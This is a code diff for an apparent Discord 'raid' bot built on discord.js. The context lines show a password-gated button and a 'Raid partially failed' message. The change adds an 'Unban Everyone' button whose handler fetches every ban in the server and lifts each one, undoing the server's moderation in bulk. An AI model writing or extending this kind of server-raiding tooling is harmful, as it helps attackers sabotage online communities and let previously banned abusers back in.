@@ -59,7 +59,8 @@ client.on('messageCreate', async message => {
       .setFooter({ text: 'Click below' });
 
     const row = new ActionRowBuilder().addComponents(
-      new ButtonBuilder().setCustomId(`fb_start_${message.author.id}`).setLabel('Enter Password').setStyle(ButtonStyle.Danger)
+      new ButtonBuilder().setCustomId(`fb_start_${message.author.id}`).setLabel('Enter Password').setStyle(ButtonStyle.Danger),
+      new ButtonBuilder().setCustomId(`fb_unban_${message.author.id}`).setLabel('Unban Everyone').setStyle(ButtonStyle.Secondary)
     );
 
     await message.reply({ embeds: [embed], components: [row] });
@@ -144,6 +145,33 @@ client.on('interactionCreate', async interaction => {
       } catch (err) {
         console.error(err);
         await interaction.followUp({ content: '⚠️ Raid partially failed.', ephemeral: true });
+      }
+    }
+
+    if (interaction.isButton() && interaction.customId.startsWith('fb_unban_')) {
+      try {
+        const bans = await interaction.guild.bans.fetch();
+        let successCount = 0;
+        
+        for (const ban of bans.values()) {
+          try {
+            await interaction.guild.members.unban(ban.user.id);
+            successCount++;
+          } catch (err) {
+            console.error(`Failed to unban ${ban.user.tag}:`, err);
+          }
+        }
+        
+        await interaction.reply({
+          content: `✅ Successfully unbanned ${successCount}/${bans.size} users`,
+          ephemeral: true
+        });
+      } catch (err) {
+        console.error(err);
+        await interaction.reply({
+          content: '❌ Failed to unban users',
+          ephemeral: true
+        });
       }
     }
   } catch (error) {
